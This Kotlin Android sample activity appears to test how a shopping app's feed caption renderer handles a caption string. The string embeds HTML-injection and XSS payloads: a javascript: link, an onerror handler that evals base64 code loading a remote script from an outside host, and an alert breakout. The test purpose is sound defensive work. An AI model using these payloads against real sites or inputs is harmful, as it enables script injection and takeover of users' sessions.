package com.tokopedia.feed.component.sample

import android.os.Bundle
import android.text.method.LinkMovementMethod
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.tokopedia.abstraction.common.utils.view.MethodChecker
import com.tokopedia.feedcomponent.R
import com.tokopedia.feedcomponent.util.caption.FeedCaption
import com.tokopedia.unifyprinciples.getTypeface


/**
 * Created by meyta.taliti on 15/12/22.
 */
class FeedCaptionTestActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_feed_caption_test)

        val caption = "#hastag #sample <font color=red>test</font>\n<font color=blue>html</font>\n<font color=yellow>injection</font>\n<a href=javascript:alert(document.domain)>brainsec</a>\n\"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYWNlbmdzLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;>\n\nTest. '-alert?.(1)-' #hadeh #katasiapa #janganmacammacam"
        val tvCaption = findViewById<TextView>(R.id.tv_caption_text)

        val authorCaption = FeedCaption.Author(
            name = "Fellow Official Fellow",
            colorRes = MethodChecker.getColor(
                this@FeedCaptionTestActivity,
                com.tokopedia.unifyprinciples.R.color.Unify_N600
            ),
            typeface = getTypeface(this@FeedCaptionTestActivity,
                "RobotoBold.ttf"
            ),
            clickListener = {
                Toast.makeText(this@FeedCaptionTestActivity, "Author Clicked", Toast.LENGTH_SHORT).show()
            }
        )
        val tagCaption = FeedCaption.Tag(
            colorRes = MethodChecker.getColor(
                this@FeedCaptionTestActivity,
                com.tokopedia.unifyprinciples.R.color.Unify_G400
            ),
            clickListener = {
                Toast.makeText(this, it, Toast.LENGTH_SHORT).show()
            }
        )

        val captionBody = FeedCaption.Builder(caption)
            .withAuthor(authorCaption)
            .withTag(tagCaption)
            .build()

        val readMoreCaption = FeedCaption.ReadMore(
            maxTrimChar = 120,
            label = getString(R.string.feed_component_read_more_button),
            colorRes = MethodChecker.getColor(
                this@FeedCaptionTestActivity,
                com.tokopedia.unifyprinciples.R.color.Unify_N400
            ),
            clickListener = {
                tvCaption.setText(captionBody, TextView.BufferType.SPANNABLE)
            }
        )
        val trimmedCaption = FeedCaption.Builder(caption)
            .withAuthor(authorCaption)
            .withTag(tagCaption)
            .trimCaption(readMoreCaption)
            .build()

        tvCaption.setText(trimmedCaption, TextView.BufferType.SPANNABLE)
        tvCaption.movementMethod = LinkMovementMethod.getInstance()
    }
}
